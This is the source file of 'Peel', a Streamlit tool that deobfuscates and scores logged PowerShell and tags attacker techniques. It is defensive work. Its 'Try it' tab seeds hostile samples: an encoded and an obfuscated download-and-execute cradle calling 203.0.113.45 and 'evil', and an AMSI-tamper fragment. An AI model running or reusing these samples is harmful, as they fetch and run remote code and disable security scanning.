"""
app.py — 🧅 Peel

Reads Windows PowerShell logging (script-block 4104, module 4103, engine 400,
process 4688/1), reassembles multi-layer commands, peels the obfuscation off
each layer, scores how obfuscated it was, and tags attacker techniques (MITRE
ATT&CK). Built to drop onto a real Elastic cluster by changing one env var.

    streamlit run app.py                                   # mock data
    FTD_MODE=elastic ES_URL=... ES_API_KEY=... streamlit run app.py
"""
from __future__ import annotations

import html
from collections import Counter, defaultdict
from datetime import datetime, timedelta, timezone

import pandas as pd
import streamlit as st

from data_source import DataSource
from detections import SEVERITY_STYLE, TACTIC, fingerprint, risk_score, severity, tag
from normalize import FIELD_INFO, data_doctor, normalize_all
from psparse import FEATURE_LABELS, features, peel
from sessions import build_sessions, obfuscation_prob, _model

st.set_page_config(page_title="Peel", page_icon="🧅", layout="wide")
MAX_FETCH = 40_000
esc = html.escape

st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
html, body, [data-testid="stAppViewContainer"], [data-testid="stSidebar"] { font-family: 'Inter', system-ui, sans-serif; }
.block-container { padding-top: 3.2rem; padding-bottom: 3rem; max-width: 1480px; }
h1,h2,h3,h4,h5 { letter-spacing: -0.02em; }
[data-testid="stMetric"] { background: rgba(16,185,129,.06); border: 1px solid rgba(16,185,129,.18);
    border-radius: 14px; padding: 12px 16px; }
[data-testid="stMetricLabel"] p { font-size: .72rem; text-transform: uppercase; letter-spacing: .07em; opacity: .7; }
.brand { font-size: 1.3rem; font-weight: 800; }
.hero .eyebrow { font-size: .72rem; text-transform: uppercase; letter-spacing: .14em; color: #10B981; font-weight: 700; }
.hero h1 { font-size: 2.2rem; font-weight: 800; margin: 0; }
.hero .sub { opacity: .6; margin: .1rem 0 1rem 0; }
.pill { display:inline-block; padding:1px 9px; border-radius:999px; font-size:.7rem; font-weight:700;
    letter-spacing:.03em; margin:1px 3px 1px 0; }
.mono { font-family:'JetBrains Mono',ui-monospace,monospace; font-size:.8rem; word-break:break-all; }
.muted { opacity:.58; } .small { font-size:.82rem; }
.card { border:1px solid rgba(128,128,128,.16); border-radius:14px; padding:14px 16px; margin-bottom:10px; }
.card.hot { border-color: rgba(220,38,38,.4); }
.layer { border-left:3px solid #10B981; padding:2px 0 2px 14px; margin:3px 0; }
.kv { display:grid; grid-template-columns:130px 1fr; gap:6px 14px; font-size:.84rem; }
.kv .k { opacity:.55; }
.gauge-wrap { background:rgba(128,128,128,.14); border-radius:999px; height:10px; overflow:hidden; }
.gauge-fill { height:100%; border-radius:999px; }
.bs-strip { display:flex; gap:10px; flex-wrap:wrap; margin:.2rem 0 1rem 0; }
.bs { flex:1; min-width:210px; border-radius:12px; padding:10px 14px; border:1px solid; }
.term { background:#0B1021; color:#D6DEEB; border-radius:12px; padding:14px 16px; font-family:'JetBrains Mono',monospace;
    font-size:.82rem; line-height:1.5; overflow-x:auto; }
.term .ps { color:#7DD3FC; } .term .cm { color:#FBBF24; } .term .rk { color:#FCA5A5; font-weight:700; }
.term .mut { color:#64748B; }
.stTabs [data-baseweb="tab-list"] { gap:6px; } .stTabs [data-baseweb="tab"] { padding:8px 14px; }
.diff-add { background:rgba(16,185,129,.18); border-radius:3px; }
.diff-del { background:rgba(220,38,38,.16); border-radius:3px; text-decoration:line-through; opacity:.7; }
</style>
""", unsafe_allow_html=True)


def pill(sev, text=None):
    fg, bg = SEVERITY_STYLE.get(sev, SEVERITY_STYLE["info"])
    return f'<span class="pill" style="color:{fg};background:{bg};border:1px solid {fg}40">{esc(text or sev)}</span>'


def tag_pill(t):
    sev = severity(t.points)
    fg, bg = SEVERITY_STYLE[sev]
    return (f'<span class="pill" style="color:{fg};background:{bg};border:1px solid {fg}40" '
            f'title="{esc(t.why)}">{esc(t.label)} · {esc(t.attck)}</span>')


def gauge(prob):
    pct = int(round(prob * 100))
    col = "#DC2626" if pct >= 66 else ("#CA8A04" if pct >= 33 else "#10B981")
    return (f'<div class="gauge-wrap"><div class="gauge-fill" style="width:{pct}%;background:{col}"></div></div>'
            f'<div class="small muted" style="margin-top:2px">obfuscation score {pct}/100</div>')


def when(ts):
    try:
        return datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except (ValueError, AttributeError):
        return None


def iso(dt):
    return pd.Timestamp(dt).tz_convert("UTC").strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


# ───────────────────────── loaders ─────────────────────────
@st.cache_resource(show_spinner="Starting Peel…")
def get_source():
    return DataSource()


@st.cache_data(ttl=300, show_spinner=False)
def load_users(since):
    return get_source().search("users_overview", since=since)[1]["aggregations"]["users"]["buckets"]


@st.cache_data(ttl=300, show_spinner=False)
def load_summary(since, user):
    req, resp = get_source().search("user_summary", user=user, since=since)
    return req, resp["hits"]["total"]["value"], resp["aggregations"]


@st.cache_data(ttl=300, show_spinner="Pulling PowerShell events…")
def load_sessions(since, user):
    reqs, hits, trunc = get_source().fetch_all("user_events", max_docs=MAX_FETCH, user=user, since=since)
    sessions, links = build_sessions(normalize_all(hits))
    return reqs, sessions, links, trunc


@st.cache_data(ttl=300, show_spinner=False)
def load_fleet(since):
    resp = get_source().search("fleet_fingerprints", since=since)[1]
    return {b["key"]: {"count": b["doc_count"], "users": b["users"]["value"], "hosts": b["hosts"]["value"]}
            for b in resp["aggregations"]["fingerprints"]["buckets"]}


@st.cache_data(ttl=300, show_spinner=False)
def load_doctor():
    resp = get_source().search("sample_for_doctor", size=500)[1]
    return data_doctor(resp["hits"]["hits"])


def all_blocks(sessions):
    out = []
    for s in sessions:
        for e in s.entries:
            if e["kind"] in ("block", "process") and (e.get("text") or e.get("command_line")):
                out.append((s, e))
    return out


# ───────────────────────── diff rendering ─────────────────────────
def render_diff(before, after):
    import difflib
    sm = difflib.SequenceMatcher(None, before, after, autojunk=False)
    bh, ah = [], []
    for op, i1, i2, j1, j2 in sm.get_opcodes():
        b, a = esc(before[i1:i2]), esc(after[j1:j2])
        if op == "equal":
            bh.append(b)
            ah.append(a)
        elif op == "delete":
            bh.append(f'<span class="diff-del">{b}</span>')
        elif op == "insert":
            ah.append(f'<span class="diff-add">{a}</span>')
        else:
            bh.append(f'<span class="diff-del">{b}</span>')
            ah.append(f'<span class="diff-add">{a}</span>')
    return "".join(bh), "".join(ah)


def render_peel(entry, links=None, blocks_by_id=None):
    """Show one block/process: layer chain, before/after, score, tags."""
    is_proc = entry["kind"] == "process"
    raw = entry.get("command_line") if is_proc else entry.get("text", "")
    peeled = entry.get("peeled", "")

    if is_proc and entry.get("decoded_from_cmdline"):
        st.markdown(f"**Launched:** `{esc((entry.get('name') or 'powershell.exe'))}` "
                    f"→ decoded {esc(entry.get('decode_how',''))}")
        st.code(raw, language="powershell", wrap_lines=True)
        st.markdown("**Decoded command:**")
        raw = entry["decoded_from_cmdline"]

    changed = entry.get("changed")
    if changed and raw.strip() and peeled.strip() and raw.strip() != peeled.strip():
        bh, ah = render_diff(raw, peeled)
        c1, c2 = st.columns(2)
        c1.markdown("**As logged** (obfuscated)")
        c1.markdown(f'<div class="term">{bh}</div>', unsafe_allow_html=True)
        c2.markdown("**Peeled** (deobfuscated)")
        c2.markdown(f'<div class="term">{ah}</div>', unsafe_allow_html=True)
    else:
        st.markdown("**Command** (no obfuscation to peel)" if not changed else "**Command**")
        st.code(peeled or raw or "(empty)", language="powershell", wrap_lines=True)

    st.markdown(gauge(entry.get("obf_prob", 0.0)), unsafe_allow_html=True)

    # linked layers
    if links and blocks_by_id and not is_proc:
        chain = _layer_chain(entry["sbid"], links, blocks_by_id)
        if len(chain) > 1:
            st.markdown("**🧅 Executed layers** (each is its own logged script block):")
            for i, sb in enumerate(chain, 1):
                b = blocks_by_id[sb]
                tags = b.get("tags", [])
                line = b["peeled"].strip().splitlines()[0][:90] if b["peeled"].strip() else "(empty)"
                st.markdown(f'<div class="layer"><b>Layer {i}</b> '
                            + (pill(b["severity"], f"risk {b['risk']}") if b["risk"] else "")
                            + f' <span class="mono muted">{esc(line)}</span></div>', unsafe_allow_html=True)

    tags = entry.get("tags", [])
    if tags:
        st.markdown("**Techniques:** " + " ".join(tag_pill(t) for t in tags), unsafe_allow_html=True)
        for t in tags:
            st.markdown(f'<span class="small muted">• <b>{esc(t.label)}</b> ({esc(t.attck)}, {esc(TACTIC.get(t.attck,""))}): {esc(t.why)}</span>', unsafe_allow_html=True)
    else:
        st.caption("No attacker techniques matched.")


def _layer_chain(sbid, links, blocks_by_id):
    root = sbid
    seen = set()
    while root in links and root not in seen:
        seen.add(root)
        root = links[root]
    chain, children = [root], defaultdict(list)
    for c, p in links.items():
        children[p].append(c)
    stack = [root]
    while stack:
        cur = stack.pop()
        for c in sorted(children.get(cur, []), key=lambda x: blocks_by_id[x]["timestamp"] or ""):
            if c not in chain:
                chain.append(c)
                stack.append(c)
    return [c for c in chain if c in blocks_by_id]


# ───────────────────────── page ─────────────────────────
source = get_source()
model = _model()

with st.sidebar:
    st.markdown('<div class="brand">🧅 Peel</div>', unsafe_allow_html=True)
    st.caption("Reassemble, deobfuscate and tag PowerShell — built on ECS `powershell.*` fields.")
    window = st.selectbox("Time window", list_windows := ["Last 24 hours", "Last 3 days", "Last 7 days", "Last 14 days"], index=3)
    since = {"Last 24 hours": "now-24h", "Last 3 days": "now-3d", "Last 7 days": "now-7d", "Last 14 days": "now-14d"}[window]
    buckets = load_users(since)
    if not buckets:
        st.warning("No PowerShell events in this window.")
        st.stop()
    counts = {b["key"]: b for b in buckets}
    user = st.selectbox("user.name", list(counts),
                        format_func=lambda u: f"{u}  ·  {counts[u]['scriptblocks']['doc_count']:,} script blocks")
    flag_min = st.slider("Flag at risk ≥", 5, 80, 25, 5)
    show_q = st.toggle("Show the Elastic queries", value=False)
    st.divider()
    if model.get("missing"):
        st.caption("⚠️ score_model.json not found — run train_score.py")
    else:
        st.caption(f"🧠 Obfuscation score: AUC {model.get('cv_auc','?')} (trained)")
    st.caption("🧪 Mock data" if source.is_mock else f"🔌 {source.target}")

sum_req, total, aggs = load_summary(since, user)
proc_reqs, sessions, links, trunc = load_sessions(since, user)
blocks_by_id = {e["sbid"]: e for s in sessions for e in s.entries if e["kind"] == "block"}
fleet = load_fleet("now-14d")

# blind-spot detection
versions = [b["key"] for b in aggs["engine_versions"]["buckets"]]
v2 = [v for v in versions if str(v).startswith("2.")]
remote_sessions = [s for s in sessions if s.remote]
# logging gaps: process launched powershell with -enc but no block in a nearby runspace/time
gap_launchers = []
for s in sessions:
    for e in s.entries:
        if e["kind"] == "process" and e.get("decoded_from_cmdline") and "-enc" in (e.get("command_line") or "").lower():
            t0 = when(e["timestamp"])
            has_block = any(b["kind"] == "block" and when(b["timestamp"]) and t0
                            and abs((when(b["timestamp"]) - t0).total_seconds()) < 60 for ss in sessions for b in ss.entries)
            if not has_block:
                gap_launchers.append(e)

hosts = ", ".join(b["key"] for b in aggs["hosts"]["buckets"]) or "—"
st.markdown(f'<div class="hero"><div class="eyebrow">Investigating</div><h1>{esc(user)}</h1>'
            f'<div class="sub">{esc(hosts)} · {esc(window.lower())}</div></div>', unsafe_allow_html=True)

flagged_sessions = [s for s in sessions if s.risk >= flag_min]
m = st.columns(5)
m[0].metric("Script blocks", f"{sum(1 for s in sessions for e in s.entries if e['kind']=='block'):,}")
m[1].metric("Sessions", f"{len([s for s in sessions if s.runspace!='(launches)']):,}")
m[2].metric("Flagged sessions", f"{len(flagged_sessions):,}")
m[3].metric("Obfuscated blocks", f"{sum(1 for b in blocks_by_id.values() if b['obf_prob']>=.5):,}")
m[4].metric("Blind spots", f"{len(v2)+len(remote_sessions)+len(gap_launchers):,}")

# ── blind-spot strip ──
strip = []
def bs_card(ok, title, body):
    fg, bg = (("#DC2626", "#FEE2E2") if not ok else ("#10B981", "#ECFDF5"))
    return f'<div class="bs" style="color:{fg};background:{bg};border-color:{fg}44"><b>{esc(title)}</b><br><span class="small">{body}</span></div>'
strip.append(bs_card(not v2, "PS v2 downgrade", f"{len(v2)} engine v2 start(s) — v2 has no script-block logging or AMSI" if v2 else "No v2 engine starts"))
strip.append(bs_card(not gap_launchers, "Logging gaps", f"{len(gap_launchers)} encoded launch(es) with no script block" if gap_launchers else "Every encoded launch has a script block"))
strip.append(bs_card(not remote_sessions, "Remote sessions", (f"{len(remote_sessions)} session(s) run by " + ", ".join(sorted({esc(s.connected_user) for s in remote_sessions}))) if remote_sessions else "No remote (WinRM) sessions"))
st.markdown('<div class="bs-strip">' + "".join(strip) + "</div>", unsafe_allow_html=True)

if trunc:
    st.info(f"Showing the first {MAX_FETCH:,} events.")
if show_q:
    with st.expander("🔍 The queries behind this page", expanded=True):
        from query_dict import users_overview, user_summary, user_events, fleet_fingerprints, live_since
        qt = st.tabs(["users_overview", "user_summary", "user_events", "fleet_fingerprints", "live_since"])
        qt[0].json(users_overview(since)["body"], expanded=2)
        qt[1].json(user_summary(user, since)["body"], expanded=2)
        qt[2].json(user_events(user, since)["body"], expanded=2)
        qt[3].json(fleet_fingerprints()["body"], expanded=2)
        qt[4].json(live_since(user, "<newest seen>")["body"], expanded=2)

tabs = st.tabs([f"🎬 Sessions ({len(flagged_sessions)})", "🧅 Peel a block", "📡 Rare & risky",
                "🧪 Try it", "🩺 Data doctor", "📶 Live"])

# ── 🎬 Sessions ──
with tabs[0]:
    real = [s for s in sessions if s.runspace != "(launches)" or s.risk >= flag_min]
    ranked = sorted(real, key=lambda s: (-s.risk, s.start or ""))
    if not ranked:
        st.info("No sessions in this window.")
    else:
        sel_key = f"sess::{user}::{since}"
        ids = [s.runspace + (s.start or "") for s in ranked]
        if st.session_state.get(sel_key) not in ids:
            st.session_state[sel_key] = ids[0]
        left, right = st.columns([0.37, 0.63], gap="large")
        with left:
            st.markdown("##### Sessions, riskiest first")
            for s, sid in zip(ranked, ids):
                with st.container(border=True):
                    head = pill(s.severity, f"{s.severity} · {s.risk}") if s.risk else pill("none", "clean")
                    st.markdown(head + (f' {pill("high","REMOTE")}' if s.remote else "")
                                + f' <span class="muted small">{esc((s.start or "")[:16].replace("T"," "))}</span>',
                                unsafe_allow_html=True)
                    nblk = sum(1 for e in s.entries if e["kind"] == "block")
                    label = "Process launches" if s.runspace == "(launches)" else f"runspace {s.runspace[:8]}"
                    st.markdown(f'<span class="small">{esc(label)} · {nblk} blocks · {esc(s.host)}</span>', unsafe_allow_html=True)
                    if s.tag_ids:
                        st.caption(" · ".join(sorted(s.tag_ids)[:4]))
                    st.button("Investigating" if st.session_state[sel_key] == sid else "Replay →",
                              key=f"sb::{sid}", use_container_width=True,
                              type="primary" if st.session_state[sel_key] == sid else "secondary",
                              on_click=lambda v=sid: st.session_state.__setitem__(sel_key, v))
        with right:
            s = next(x for x, sid in zip(ranked, ids) if sid == st.session_state[sel_key])
            st.markdown(f"##### Replay — {esc(s.host)} · {esc((s.start or '')[:19].replace('T',' '))}")
            if s.remote:
                st.warning(f"Remote session: commands run by **{esc(s.connected_user)}** (not {esc(s.user)}) over WinRM.")
            if s.versions:
                vv = ", ".join(sorted(set(s.versions)))
                (st.error if any(v.startswith("2.") for v in s.versions) else st.caption)(f"Engine version(s): {vv}")
            # terminal transcript
            lines = []
            for e in s.entries:
                tl = (e.get("timestamp") or "")[11:19]
                if e["kind"] == "engine":
                    lines.append(f'<span class="mut">{tl}  ── engine {esc(e.get("code"))} v{esc(str(e.get("version")))} ──</span>')
                elif e["kind"] == "process":
                    txt = e.get("peeled") or e.get("command_line") or ""
                    rk = f'<span class="rk">[risk {e["risk"]}]</span> ' if e.get("risk") else ""
                    lines.append(f'<span class="mut">{tl}</span> {rk}<span class="ps">▶ {esc((e.get("name") or "proc"))}</span> {esc(txt[:160])}')
                elif e["kind"] == "module":
                    det = e.get("details") or []
                    params = " ".join(f'-{d.get("name")} {d.get("value")}' for d in det if d.get("type") == "ParameterBinding" and d.get("name"))
                    lines.append(f'<span class="mut">{tl}</span> <span class="cm">∷ {esc(str(e.get("name") or ""))}</span> <span class="mut">{esc(params[:120])}</span>')
                else:
                    first = (e.get("peeled") or "").strip().splitlines()
                    head = first[0] if first else ""
                    rk = f'<span class="rk">[risk {e["risk"]}]</span> ' if e.get("risk") else ""
                    extra = f' <span class="mut">(+{len(first)-1} lines)</span>' if len(first) > 1 else ""
                    lines.append(f'<span class="mut">{tl}</span> {rk}<span class="ps">PS&gt;</span> {esc(head[:160])}{extra}')
            st.markdown('<div class="term">' + "<br>".join(lines) + "</div>", unsafe_allow_html=True)
            # inspect one entry
            insp = [e for e in s.entries if e["kind"] in ("block", "process") and (e.get("text") or e.get("command_line"))]
            if insp:
                st.divider()
                idx = st.selectbox("Inspect an entry", range(len(insp)),
                                   format_func=lambda i: f'{(insp[i].get("timestamp") or "")[11:19]} · '
                                   + (insp[i].get("name", "block") if insp[i]["kind"] == "process" else "script block")
                                   + (f' · risk {insp[i]["risk"]}' if insp[i].get("risk") else ""),
                                   key=f"insp::{st.session_state[sel_key]}")
                render_peel(insp[idx], links, blocks_by_id)

# ── 🧅 Peel a block ──
with tabs[1]:
    st.caption("Every script block and decoded launch for this user, most-obfuscated first. "
               "Pick one to see its layers peeled.")
    items = all_blocks(sessions)
    items.sort(key=lambda se: (-se[1].get("obf_prob", 0), -(se[1].get("risk") or 0)))
    if not items:
        st.info("No script blocks.")
    else:
        def lbl(i):
            s, e = items[i]
            txt = (e.get("peeled") or e.get("command_line") or "").strip().replace("\n", " ")[:70]
            obf = int(e.get("obf_prob", 0) * 100)
            return f'[obf {obf:3d}] {("proc" if e["kind"]=="process" else "block")} · {txt}'
        i = st.selectbox("Script block", range(len(items)), format_func=lbl)
        render_peel(items[i][1], links, blocks_by_id)

# ── 📡 Rare & risky ──
with tabs[2]:
    st.caption("Each block's command is normalized to a **fingerprint** (paths, IPs, GUIDs, numbers, strings → placeholders), "
               "then counted across the whole fleet. Rare shapes + technique tags rise to the top.")
    rows = []
    for s in sessions:
        for e in s.entries:
            if e["kind"] != "block":
                continue
            fp = e.get("fingerprint") or fingerprint(e.get("peeled", ""))
            info = fleet.get(fp, {})
            rows.append({
                "when": (e.get("timestamp") or "")[:19].replace("T", " "),
                "risk": e.get("risk", 0),
                "obf": int(e.get("obf_prob", 0) * 100),
                "fleet_seen": info.get("count", 0),
                "hosts": info.get("hosts", 0),
                "techniques": ", ".join(t.label for t in e.get("tags", [])),
                "command": (e.get("peeled") or "").strip().replace("\n", " ⏎ ")[:140],
                "_sbid": e["sbid"],
            })
    df = pd.DataFrame(rows)
    if df.empty:
        st.info("No script blocks.")
    else:
        c = st.columns(3)
        only_rare = c[0].toggle("Only rare (seen ≤ 2 in fleet)", value=False)
        only_tagged = c[1].toggle("Only with techniques", value=False)
        only_flagged = c[2].toggle(f"Only risk ≥ {flag_min}", value=False)
        view = df.copy()
        if only_rare:
            view = view[view["fleet_seen"] <= 2]
        if only_tagged:
            view = view[view["techniques"] != ""]
        if only_flagged:
            view = view[view["risk"] >= flag_min]
        view = view.sort_values(["risk", "obf", "fleet_seen"], ascending=[False, False, True])
        st.caption(f"{len(view):,} of {len(df):,} script blocks · rarest and riskiest first")
        ev = st.dataframe(
            view[["when", "risk", "obf", "fleet_seen", "hosts", "techniques", "command"]],
            column_config={
                "when": "When", "risk": st.column_config.ProgressColumn("Risk", min_value=0, max_value=100, format="%d"),
                "obf": st.column_config.ProgressColumn("Obf", min_value=0, max_value=100, format="%d"),
                "fleet_seen": st.column_config.NumberColumn("Fleet seen", help="Times this fingerprint appears fleet-wide"),
                "hosts": "Hosts", "techniques": "Techniques",
                "command": st.column_config.TextColumn("Command (peeled)", width="large")},
            hide_index=True, use_container_width=True, height=360, on_select="rerun",
            selection_mode="single-row", key=f"rr::{user}::{since}")
        if ev.selection.rows:
            sbid = view.iloc[ev.selection.rows[0]]["_sbid"]
            if sbid in blocks_by_id:
                st.divider()
                render_peel(blocks_by_id[sbid], links, blocks_by_id)

# ── 🧪 Try it ──
with tabs[3]:
    st.caption("Paste any PowerShell (or a `powershell.exe -enc …` command line). Peel deobfuscates it from the "
               "syntax tree — nothing is executed — scores how obfuscated it was, and tags techniques.")
    sample = st.selectbox("Load an example", ["—",
        "Encoded launch (-enc)", "Obfuscated download cradle", "AMSI tamper", "Clean admin command"])
    seed = {
        "Encoded launch (-enc)": f'powershell.exe -nop -w hidden -enc {__import__("base64").b64encode("IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.45/s.ps1\')".encode("utf-16-le")).decode()}',
        "Obfuscated download cradle": "$u='ht'+'tp://evil/x';&($ShellId[1]+$ShellId[13]+'x')((New-Object Net.WebClient).('Down'+'loadString').Invoke($u))",
        "AMSI tamper": "$k=[char[]](65,109,115,105)-join '';[Ref].Assembly.GetType('System.Management.Automation.'+$k+'Utils')",
        "Clean admin command": "Get-ChildItem C:\\Logs -Recurse -Filter *.log | Where-Object Length -gt 1MB | Sort-Object Length -Descending",
    }.get(sample, "")
    # key depends on the chosen example so picking one re-seeds the box
    text = st.text_area("PowerShell", value=seed, height=140, key=f"tryit::{sample}",
                        placeholder="IEX ((New-Object Net.WebClient).DownloadString('http://...'))")
    if text.strip():
        from psparse import script_from_command_line
        decoded, how = script_from_command_line(text)
        target = decoded or text
        if decoded:
            st.markdown(f"**Decoded {esc(how)}:**")
        pr = peel(target)
        entry = {"kind": "block", "text": target, "peeled": pr.text, "inner": pr.inner,
                 "changed": True, "obf_prob": obfuscation_prob(target, pr),
                 "tags": tag(pr.text), "risk": risk_score(tag(pr.text), obfuscation_prob(target, pr))}
        render_peel(entry)
        with st.expander("Obfuscation features (what the score looked at)"):
            feats = features(target, pr)
            fr = pd.DataFrame([{"feature": FEATURE_LABELS.get(k, k), "value": round(v, 3)} for k, v in feats.items()])
            st.dataframe(fr, hide_index=True, use_container_width=True)
        if pr.inner:
            st.markdown("**Inner layers handed to IEX / ScriptBlock::Create:**")
            for s2 in pr.inner:
                st.code(s2[:400], language="powershell", wrap_lines=True)

# ── 🩺 Data doctor ──
with tabs[4]:
    st.caption("Before you trust any of this on real data: this samples recent events and checks how well each field "
               "Peel needs is populated. Map anything **missing** in `normalize.py`, then re-check.")
    rep = load_doctor()
    if rep["healthy"]:
        st.success("All critical fields are present. Peel has what it needs.")
    else:
        st.error("Missing critical field(s): " + ", ".join(rep["critical_missing"])
                 + ". Map these in normalize.py (FIELD_PATHS).")
    st.markdown(f"**Sample:** {rep['total']} events · by event.code: "
                + ", ".join(f"`{k}`×{v}" for k, v in sorted(rep["by_code"].items())))
    drows = [{"field": r["field"], "critical": "★" if r["critical"] else "",
              "coverage": int(round(r["coverage"] * 100)), "source": r["source"],
              "status": r["status"], "what it's for": r["desc"]} for r in rep["rows"]]
    st.dataframe(pd.DataFrame(drows), hide_index=True, use_container_width=True, height=560,
                 column_config={"coverage": st.column_config.ProgressColumn("Coverage", min_value=0, max_value=100, format="%d%%"),
                                "critical": st.column_config.TextColumn("Crit", width="small")})

# ── 📶 Live ──
with tabs[5]:
    st.caption("Polls for new script blocks every 3 s, peels and tags each as it arrives. Flagged blocks pop a toast.")
    if st.toggle("Go live", key=f"live::{user}"):
        @st.fragment(run_every="3s")
        def live():
            key = f"livestate::{user}"
            if key not in st.session_state:
                st.session_state[key] = {"cursor": datetime.now(timezone.utc) - timedelta(seconds=60),
                                         "seen": set(), "rows": [], "polls": 0, "flagged": 0}
            stt = st.session_state[key]
            _, resp = get_source().search("live_since", user=user, since_ts=iso(stt["cursor"] - timedelta(seconds=10)))
            stt["polls"] += 1
            recs = normalize_all(resp["hits"]["hits"])
            sess, lk = build_sessions(recs)
            fresh = []
            for s in sess:
                for e in s.entries:
                    if e["kind"] not in ("block", "process"):
                        continue
                    key2 = e.get("sbid") or e.get("entity_id")
                    if key2 and key2 not in stt["seen"]:
                        stt["seen"].add(key2)
                        fresh.append(e)
                        if e.get("risk", 0) >= flag_min:
                            stt["flagged"] += 1
                            st.toast(f"risk {e['risk']}: {', '.join(t.label for t in e.get('tags',[]))}", icon="🚨")
            if fresh:
                newest = max((when(e["timestamp"]) for e in fresh if when(e["timestamp"])), default=None)
                if newest:
                    stt["cursor"] = max(stt["cursor"], newest)
                stt["rows"] = [(e.get("timestamp", "")[11:19], e.get("risk", 0), severity(e.get("risk", 0)),
                                (e.get("peeled") or e.get("command_line") or "").strip().replace("\n", " ")[:120])
                               for e in fresh] + stt["rows"]
                del stt["rows"][200:]
            c = st.columns(3)
            c[0].metric("Blocks seen", len(stt["seen"]))
            c[1].metric("Flagged", stt["flagged"])
            c[2].metric("Polls", stt["polls"])
            body = []
            for tl, rk, sv, txt in stt["rows"][:40]:
                body.append(f'<div class="card {"hot" if rk>=flag_min else ""}" style="padding:6px 12px;margin-bottom:4px">'
                            f'<span class="mono muted">{tl}</span> {pill(sv, str(rk)) if rk else pill("none","ok")} '
                            f'<span class="mono">{esc(txt)}</span></div>')
            st.markdown("".join(body) or "<span class='muted'>Waiting…</span>", unsafe_allow_html=True)
        live()
